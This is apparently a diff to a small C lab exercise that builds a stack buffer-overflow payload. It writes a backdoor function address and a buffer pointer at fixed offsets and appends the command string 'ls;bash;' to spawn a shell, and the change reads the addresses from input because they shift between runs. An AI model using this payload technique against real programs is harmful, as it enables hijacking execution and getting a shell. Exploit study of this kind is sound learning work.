@@ -6,6 +6,8 @@
 #define uint unsigned int
 
 const char code[] = "ls;bash;";
+
+// don't work, address will change
 uint bdoor_addr = 0x565c063d;
 uint buf_addr = 0xffbd01b0;
 
@@ -15,9 +17,10 @@ int main(){
 
     printf("Stack overflow volnerability starting up...\n");
     
+    scanf("%x %x", &bdoor_addr, &buf_addr);
     memset(buf, 'x', sizeof(buf));
-    *(uint *)(&buf[44]) = bdoor_addr;
-    *(uint *)(&buf[52]) = buf_addr + 68;
+    *((uint *)(&buf[44])) = bdoor_addr;
+    *((uint *)(&buf[52])) = buf_addr + 68;
     memcpy(&buf[68], code, strlen(code)); // ls;
     buf[BUF_SIZE-1] = '\0'; // end
     // printf("%s\n", buf);
